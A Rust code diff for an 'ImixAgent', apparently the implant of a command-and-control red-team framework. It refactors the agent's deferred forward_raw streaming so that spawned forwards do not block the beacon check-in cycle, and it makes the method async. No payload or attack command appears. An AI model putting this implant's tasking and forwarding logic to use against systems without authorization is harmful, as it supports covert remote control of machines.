@@ -311,8 +311,8 @@ impl ImixAgent {
         }
         // 2. Create new transport from config
         let config = self.get_transport_config().await;
-        let t = transport::create_transport(config)
-            .context("Failed to create on-demand transport")?;
+        let t =
+            transport::create_transport(config).context("Failed to create on-demand transport")?;
 
         #[cfg(debug_assertions)]
         log::debug!("Created on-demand transport for background task");
@@ -336,26 +336,29 @@ impl ImixAgent {
     }
 
     pub async fn process_job_request(&self) -> Result<()> {
-        // Dispatch any pending forward_raw requests before checking in
-        {
+        // Dispatch any pending forward_raw requests before checking in.
+        // Each forward is spawned so the beacon cycle is not blocked by long-running
+        // streaming calls (e.g. ReportFile).
+        let pending: Vec<_> = {
             let mut forwards = self.pending_forwards.lock().await;
-            for (path, rx, tx) in forwards.drain(..) {
-                let agent = self.clone();
-                self.runtime_handle.spawn(async move {
-                    if let Ok(mut t) = agent.get_usable_transport().await {
-                        if let Err(_e) = t.forward_raw(path.clone(), rx, tx).await {
-                            #[cfg(debug_assertions)]
-                            log::error!("Deferred forward_raw to {} failed: {}", path, _e);
-                        }
-                    } else {
+            forwards.drain(..).collect()
+        };
+        for (path, rx, tx) in pending {
+            let agent = self.clone();
+            self.runtime_handle.spawn(async move {
+                if let Ok(mut t) = agent.get_usable_transport().await {
+                    if let Err(_e) = t.forward_raw(path.clone(), rx, tx).await {
                         #[cfg(debug_assertions)]
-                        log::error!(
-                            "Failed to get transport for deferred forward_raw to {}",
-                            path
-                        );
+                        log::error!("Deferred forward_raw to {} failed: {}", path, _e);
                     }
-                });
-            }
+                } else {
+                    #[cfg(debug_assertions)]
+                    log::error!(
+                        "Failed to get transport for deferred forward_raw to {}",
+                        path
+                    );
+                }
+            });
         }
 
         let resp = self.claim_tasks().await?;
@@ -447,6 +450,7 @@ impl ImixAgent {
 }
 
 // Implement the Eldritch Agent Trait
+#[async_trait::async_trait]
 impl Agent for ImixAgent {
     fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
         self.with_transport(|mut t| async move {
@@ -534,17 +538,15 @@ impl Agent for ImixAgent {
         self.with_transport(|mut t| async move { t.claim_tasks(req).await })
     }
 
-    fn forward_raw(
+    async fn forward_raw(
         &self,
         path: String,
         rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
         tx: tokio::sync::mpsc::Sender<Vec<u8>>,
     ) -> Result<(), String> {
-        self.block_on(async {
-            let mut forwards = self.pending_forwards.lock().await;
-            forwards.push((path, rx, tx));
-            Ok(())
-        })
+        let mut forwards = self.pending_forwards.lock().await;
+        forwards.push((path, rx, tx));
+        Ok(())
     }
 
     fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
